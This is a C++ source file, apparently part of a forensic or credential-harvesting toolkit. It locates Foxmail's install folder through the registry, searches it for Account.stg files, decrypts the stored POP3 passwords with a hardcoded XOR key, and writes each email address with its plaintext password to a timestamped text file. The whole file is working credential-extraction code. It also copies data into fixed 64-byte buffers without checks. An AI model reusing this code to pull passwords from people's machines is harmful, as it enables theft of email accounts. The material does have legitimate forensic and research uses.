#include "StdAfx.h"
#include "EvidenceFoxMail.h"
#include "psapi.h"
#include "until.h"

#pragma comment(lib, "Psapi.lib")

CEvidenceFoxMail::CEvidenceFoxMail(void)
{
	::ZeroMemory(m_szAppPath, sizeof(m_szAppPath));	
	::ZeroMemory(m_szOutPath, sizeof(m_szOutPath));
	::ZeroMemory(m_szOutFileName, sizeof(m_szOutFileName));	
}


CEvidenceFoxMail::~CEvidenceFoxMail(void)
{

}


BOOL CEvidenceFoxMail::IsFoxInstall()
{
	return GetPathInReg();
}


BOOL CEvidenceFoxMail::StartWork()
{
	SYSTEMTIME tmSystem = {0};
	GetSystemTime(&tmSystem);
	::ZeroMemory(m_szOutFileName, sizeof(m_szOutFileName));
	wsprintf(m_szOutFileName, "%s\\Account_%04d%02d%02d%02d%02d%02d.txt", m_szOutPath, tmSystem.wYear,tmSystem.wMonth, tmSystem.wDay, tmSystem.wHour, tmSystem.wMinute, tmSystem.wSecond);
	MakeSureDirectoryPathExists(m_szOutPath);

	return RecursePassFile(m_szAppPath);
}


BOOL CEvidenceFoxMail::GetPathInReg()
{
	TCHAR szPath[MAX_PATH] = {0};
	BOOL bRet = GetRegValue(HKEY_CURRENT_USER, "Software\\Aerofox\\Foxmail", "Executable", szPath);
	if (!bRet || 0 == lstrlen(szPath))
	{
		return FALSE;
	}

	char *pPosEnd = StrRChr(szPath, NULL, '\\');
	if (NULL != pPosEnd)
	{
		*(pPosEnd) = 0;
	}

	lstrcpy(m_szAppPath, szPath);

	return bRet;
}


BOOL CEvidenceFoxMail::RecursePassFile(LPSTR lpPath)
{	
	char szFindPath[MAX_PATH] = {0};
	wsprintf(szFindPath, "%s\\*.*", lpPath);

	WIN32_FIND_DATA	FindFileData = {0};

	HANDLE hFile = ::FindFirstFile(szFindPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}



	BOOL bRet = FALSE;
	do 
	{		
		CHAR *pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
		{
			continue;
		}

		char szFullPath[MAX_PATH] = {0};
		wsprintf(szFullPath, "%s\\%s", lpPath, pszFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			RecursePassFile(szFullPath);
		}

		if (0 == lstrcmpi(pszFileName, "Account.stg"))
		{
			//解密密码文件
			char szOutBuf[MAX_PATH] = {0};
			bRet = DecryptPassFile(szFullPath, szOutBuf);
			if (!bRet)
			{
				return bRet;
			}

			//将密码信息存入文件
			WritePassToFile(m_szOutFileName, szOutBuf);	

			bRet = TRUE;
			//break; //多个skype帐号登陆时全部获取
		}

	} while(FindNextFile(hFile, &FindFileData));	

	return bRet;
}


BOOL CEvidenceFoxMail::SetOutputDir(LPCTSTR strOutPath)
{
	lstrcpy(m_szOutPath, strOutPath); 
	::MakeSureDirectoryPathExists(m_szOutPath);

	return TRUE;
}


BOOL CEvidenceFoxMail::DecryptPassFile(LPSTR lpFileName, LPSTR lpOutBuf)
{	 
	CHAR szUser[64] = {0};
	CHAR szPassEnc[64] = {0};
	BOOL bRet = GetAccountInfo(lpFileName, szUser, szPassEnc);
	if (!bRet)
	{
		return bRet;
	}

	CHAR szPassDec[64] = {0};
	bRet = DecodeFoxmailPassword(szPassEnc, szPassDec);
	if (!bRet)
	{
		return bRet;
	}

	if (NULL != lpOutBuf)
	{
		wsprintf(lpOutBuf, "%s %s", szUser, szPassDec);
		strcat(lpOutBuf, "\r\n");
	}

	return TRUE;
}


BOOL CEvidenceFoxMail::GetAccountInfo(LPSTR lpFileName, LPSTR lpUser, LPSTR lpPassEnc)
{
	HANDLE hFile = ::CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	do 
	{
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		if (0 >= dwFileSize)
		{
			break;
		}

		BYTE *szBufRead = new BYTE[dwFileSize];
		::ZeroMemory(szBufRead, dwFileSize);
		DWORD dwRead = 0;

		BOOL bRead = ReadFile(hFile, szBufRead, dwFileSize, &dwRead, NULL);
		if (!bRead || dwRead != dwFileSize)
		{
			break;
		}

		BYTE *pBegin = NULL;
		BYTE *pEnd = NULL;
		BOOL bUser = FALSE;
		BOOL bPass = FALSE;

		for (DWORD i=0; i<dwFileSize-3; i++)
		{
			if (*(WORD*)(&szBufRead[i]) == 0x0A0D )
			{

				if (NULL == pBegin)
				{
					pBegin = &szBufRead[i+2];
				}
				else
				{
					pEnd = &szBufRead[i-1];
				}

				if (NULL != pBegin && NULL != pEnd)
				{
					if (pEnd - pBegin > 64)
					{
						pBegin = NULL;
						pEnd = NULL;

						continue;
					}

					char szTemp[64] = {0};
					memcpy(szTemp, pBegin, pEnd-pBegin+1);

					if (!bUser)
					{
						bUser = MatchString(szTemp, "MailAddress=", lpUser);
					}
					
					if (!bPass)
					{
						bPass = MatchString(szTemp, "POP3Password=", lpPassEnc);
					}
					
					if (bUser && bPass)
					{
						break;
					}

					pBegin = pEnd + 3;
					pEnd = NULL;
				}			
			}
		}

		bRet = TRUE;		

	} while (FALSE);

	CloseHandle(hFile);

	return bRet;
}


BOOL CEvidenceFoxMail::MatchString(LPSTR lpSrc, LPSTR lpMatch, LPSTR lpOut)
{
	if (NULL == lpSrc || NULL == lpMatch || NULL == lpOut)
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	LPSTR lpPos = StrStrI(lpSrc, lpMatch);
	if (NULL != lpPos)
	{
		lstrcpy(lpOut, lpPos+lstrlen(lpMatch));
		bRet = TRUE;
	}

	return bRet;
}


BOOL CEvidenceFoxMail::DecodeFoxmailPassword(
						  /*IN*/  char* szEncPwd,     /*max len = 34, not include the '\0'*/
						  /*OUT*/ char* szDecPwd      /*max len = 16, not include the '\0'*/
						  )
{
	unsigned char arrKey[8] = {0x7E,0x64,0x72,0x61,0x47,0x6F,0x6E,0x7E};
	unsigned char arrEncPwd[20];
	unsigned long ulTemp;
	unsigned int i;
	unsigned long ulEncPwdLen;
	int nTmp;

	//计算并检查加密字符串的长度
	ulEncPwdLen = strlen(szEncPwd);
	if (ulEncPwdLen > 34 
		|| ulEncPwdLen % 2 != 0
		|| ulEncPwdLen == 0)
	{
		return FALSE;
	}

	//长度/2是实际的字节数
	ulEncPwdLen /= 2;

	//将字符串转为二进制数组
	for (i=0; i<ulEncPwdLen; i++)
	{
		if (sscanf(szEncPwd + i*2, "%02X", &ulTemp) != 1)
		{
			return FALSE;
		}
		arrEncPwd[i] = (unsigned char)ulTemp;
	}

	//计算第一字节密码明文（第一字节特殊处理，需要异或0x5A）
	szDecPwd[0] = nTmp = (arrEncPwd[1] ^ arrKey[0]) - (0x5A ^ arrEncPwd[0]);
	if (nTmp < 0)
	{
		szDecPwd[0]--;
	}

	//计算接下来的所有密码明文
	for (i=1; i<ulEncPwdLen-1; i++)
	{
		szDecPwd[i] = nTmp = (arrEncPwd[i+1] ^ arrKey[i%sizeof(arrKey)]) - arrEncPwd[i];
		if (nTmp < 0)
		{
			szDecPwd[i]--;
		}
	}

	//末尾加上'\0'
	szDecPwd[i] = '\0';

	return TRUE;
}


BOOL CEvidenceFoxMail::WritePassToFile(LPSTR lpFileName, LPSTR lpBuffer)
{
	HANDLE hFile = ::CreateFile(lpFileName, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return FALSE;
	}

	BOOL bRet = FALSE;
	do 
	{
		SetFilePointer(hFile, 0, NULL, FILE_END);

		DWORD dwWrite = 0;
		BOOL bRetWrite = WriteFile(hFile, lpBuffer, lstrlen(lpBuffer), &dwWrite, NULL);
		if (!bRetWrite || dwWrite != lstrlen(lpBuffer))
		{			
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	CloseHandle(hFile);

	return bRet;
}

